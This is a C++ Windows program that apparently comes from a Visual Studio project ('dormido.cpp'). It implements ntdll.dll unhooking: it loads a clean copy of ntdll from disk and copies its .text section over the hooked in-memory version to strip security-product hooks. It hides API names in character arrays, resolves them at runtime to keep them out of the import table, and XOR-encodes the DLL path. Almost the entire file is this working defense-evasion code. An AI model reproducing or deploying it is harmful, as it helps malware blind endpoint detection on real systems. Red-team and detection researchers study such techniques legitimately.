// dormido.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//

#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")



typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);

unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };


static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
	/*
		UnhookNtdll() finds .text segment of fresh loaded copy of ntdll.dll and copies over the hooked one
	*/
	// create a pointer to the NTHeaders of the unhooked NTDLL.dll binary.
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER)pMapping;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pImgDOSHead->e_lfanew);
	int i;
	// string obfuscation of VirtualProtect0x0 using a character array rather than char *.
	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
	// create pointer to the virtualProtect function for use w/o adding the function to our import address table.
	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);

	// find .text section
	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) +
			((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
		//compare the section name with ".text" if passes continue.
		if (!strcmp((char*)pImgSectionHead->Name, ".text")) {
			// prepare ntdll.dll memory region for write permissions.
			// open the hooked NTDLL.dll memory location + the virtual address of the unhooked .text section and change the entire .text region to execute_readwrite mem permissions.
			VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				pImgSectionHead->Misc.VirtualSize,
				PAGE_EXECUTE_READWRITE,
				&oldprotect);

			//simply checks if oldProtect has a value, should be execute_read.
			if (!oldprotect) {
				// RWX failed!
				return -1;
			}
			// copy fresh .text section into ntdll memory
			// use mem copy to copy entire .text section over the unhooked NTDLL.dll over the hooked version of the NTDLL.dll
			memcpy((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				(LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				pImgSectionHead->Misc.VirtualSize);

			// restore original protection settings of ntdll memory
			VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				pImgSectionHead->Misc.VirtualSize,
				oldprotect,
				&oldprotect);
			if (!oldprotect) {
				// it failed
				return -1;
			}
			return 0;
		}
	}

	// failed? .text not found!
	return -1;
}


void XORcrypt(char str2xor[], size_t len, char key) {

	int i;

	for (i = 0; i < len; i++) {
		str2xor[i] = (BYTE)str2xor[i] ^ key;
	}
}



int main()
{
	HANDLE hProc = NULL;

	//unsigned char sNtdllPath[] = "c:\\windows\\system32\\ndll.dll";
	unsigned char sNtdllPath[] = { 0x59, 0x0, 0x66, 0x4d, 0x53, 0x54, 0x5e, 0x55, 0x4d, 0x49, 0x66, 0x49, 0x43, 0x49, 0x4e, 0x5f, 0x57, 0x9, 0x8, 0x66, 0x54, 0x4e, 0x5e, 0x56, 0x56, 0x14, 0x5e, 0x56, 0x56, 0x3a };

	unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
	unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
	unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };

	unsigned int sNtdllPath_len = sizeof(sNtdllPath);
	unsigned int sNtdll_len = sizeof(sNtdll);
	int ret = 0;
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID pMapping;

	// get function pointers
	// used to import functions for use without adding them to the import table directory.
	CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sCreateFileMappingA);
	MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sMapViewOfFile);
	UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sUnmapViewOfFile);

	// open ntdll.dll
	// opens a fresh copy of the NTDLL.dll binary.
	// starts by xor decrypting the NTDLL.dll file path
	XORcrypt((char*)sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);
	// opens a handle to the unhooked version of the NTDLL.dll binary.
	hFile = CreateFileA((LPCSTR)sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		// failed to open ntdll.dll

	}

	// prepare file mapping
	// then we create a file mapping for our fresh NTDLL.dll copy.
	hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (!hFileMapping) {
		// file mapping failed
		CloseHandle(hFile);
	}

	// map the bastard
	// then we map the file into our process memory!
	pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!pMapping) {
		// mapping failed
		CloseHandle(hFileMapping);
		CloseHandle(hFile);
	}


	// remove hooks
	// then we call our unhooking function, by passing as parameters the location of the hooking NTDLL.dll memory location and our mapped unhooked version.
	ret = UnhookNtdll(GetModuleHandleA((LPCSTR)sNtdll), pMapping);



	// Clean up.
	UnmapViewOfFile_p(pMapping);
	CloseHandle(hFileMapping);
	CloseHandle(hFile);
	Sleep(500000);
}

// Ejecutar programa: Ctrl + F5 o menú Depurar > Iniciar sin depurar
// Depurar programa: F5 o menú Depurar > Iniciar depuración

// Sugerencias para primeros pasos: 1. Use la ventana del Explorador de soluciones para agregar y administrar archivos
//   2. Use la ventana de Team Explorer para conectar con el control de código fuente
//   3. Use la ventana de salida para ver la salida de compilación y otros mensajes
//   4. Use la ventana Lista de errores para ver los errores
//   5. Vaya a Proyecto > Agregar nuevo elemento para crear nuevos archivos de código, o a Proyecto > Agregar elemento existente para agregar archivos de código existentes al proyecto
//   6. En el futuro, para volver a abrir este proyecto, vaya a Archivo > Abrir > Proyecto y seleccione el archivo .sln
